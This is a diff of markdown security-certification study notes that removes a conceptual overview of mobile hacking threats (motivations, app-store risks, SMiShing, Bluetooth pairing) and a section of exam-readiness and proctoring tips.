+- Pairing with malicious devices may enable e.g. [BlueSnarfing](./../09-wireless-networks/bluetooth.md#bluesnarfing) and [BlueBugging](./../09-wireless-networks/bluetooth.md#bluebugging)
 # Hacking mobile platforms
 
 ## Mobile platform attack vectors
@@ -12115,80 +11902,6 @@ BYOD policies should include:
 - [Privilege escalation](./../06-system-hacking/escalating-privileges.md)
 - Data dumping
 - OS command execution
-# Mobile hacking
-
-## Motivations
-
-- **Surveillance**: • Audio • Camera • Call logs • Location • SMS messages
-- **Financial**: • sending high rate SMS • stealing transaction authentication numbers (TANs) • extortion via ransomware • fake antivirus • making expensive calls
-- **Data theft**: • Account details • Contacts • Call logs • phone number • stealing IMEI
-- **Botnet activity**: • launching DDoS attacks • click fraud • sending SMS
-- **Impersonation**: • SMS redirection, sending e-mail messages, posting to social media
-
-## Attack vectors
-
-- Malware
-- Data exfiltration
-- Data tampering
-- Data loss
-
-## Vulnerabilities and risks
-
-- Malicious apps in stores
-- Mobile malware
-- App sandboxing vulnerabilities
-- Weak device and app encryption
-- OS and app update issues
-- Jailbreaking and rooting
-- Mobile application vulnerabilities
-- Privacy issues (Geolocation)
-- Weak data security
-- Excessive permissions
-- Weak communication security
-- Physical attacks
-- Insufficient code obfuscation
-- Insufficient transport layer security
-- Insufficient session expiration
-
-## Security issues from App Stores
-
-- Used to distribute malware/malicious apps
-- App: Software that runs on mobile devices
-- App Store: Distribution platform
-  - Can be from owners of the OS e.g. Apple, Google play, Microsoft.
-  - Or third parties e.g. Amazon Appstore, GetJar, and APKMirror.
-- Can be distributed through
-  - legitimate app stores
-    - because of insufficient or no vetting of apps
-  - unofficial app stores
-    - user is social engineered to download and execute
-
-## Sandboxing
-
-- App sandboxing
-  - Limits resources available to an app
-  - Isolates one from another
-  - ❗ A vulnerable one can still be exploited
-
-## Mobile spam
-
-- Also known as SMS spam, text spam, or m-spam
-- Advertisements or malicious links
-- E.g. you've won a prize, click here to claim it.
-
-## SMiShing
-
-- SMS phishing
-- Acquire personal information through SMS with malicious links
-- Effective as
-  - Easy through e.g. using prepaid SMS card using fake identity
-  - Usually not checked by antiviruses
-  - Users are not familiar
-- E.g. "PayPal - your account has been locked"
-
-## Pairing
-
-- Pairing with malicious devices may enable e.g. [BlueSnarfing](./../09-wireless-networks/bluetooth.md#bluesnarfing) and [BlueBugging](./../09-wireless-networks/bluetooth.md#bluebugging)
 # IoT overview
 
 ## IoT basics
@@ -12661,46 +12374,3 @@ BYOD policies should include:
   - Monitor traffic on port 48101 for infected traffic
   - Disable telnet as it's insecure protocol
   - Disable Guest or Demo user accounts
-# Exam readiness
-
-- 125 questions in 4 hours (around ≈ 2 min per question)
-
-## Tips for reviewing the notes
-
-- Good idea to repeat common exam areas (marked with 📝) before the exam.
-- Do practice tests, and search for the information you're not sure about while doing to tests to get a better understanding.
-
-## Rules
-
-- No interruption is allowed, e.g. going to toilet
-  - Go to toilet before.
-- Allowed to have paper and pencil, but probably not needed.
-- Home proctored, ensure you have more than 4 hours to talk to the proctor.
-- Your room:
-  - Door must be closed
-  - Cannot have more than one monitor (if laptop, only laptop screen)
-  - No more than one PC
-  - They require you to put your cell-phone far from camera where they can see it.
-- Have your exam code ready, on paper on a text-editor ready to copy / paste
-- You'll install software where proctor can see your desktop, see you on camera and listen to your on microphone.
-- Microphone must stay on
-- No headset is allowed
-- For any problems you have a live chat window where proctor will answer to technical issues e.g. page is frozen.
-- You can not speak during exam, cannot read questions out loud.
-- You can reschedule if you're not ready.
-- Scheduling exam: Manual process by writing to them with e-mail confirmations.
-
-## Answers
-
-- Not so much trickery, the answer that "sounds" true is likely to be true
-- Encryption and authentication (e.g. • [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) • [DNSSec](../08-sniffing/sniffing-attacks-overview.md#dnssec-domain-name-system-security-extension)) are generally best solutions.
-- Active/passive analogy is quite popular where active usually involves "interaction with the target".
-
-## Exam techniques
-
-- Read slowly, don't rush, if you don't understand question when reading twice, skip
-  - Some answers can be correct answers for different questions.
-  - Important to understand the question.
-- Don't be scared: Questions looking complicated are not so complicated
-- Sometimes multiple answers are right, but they want the most correct one.
-  - Don't overthink, the simpler is probably the right one.
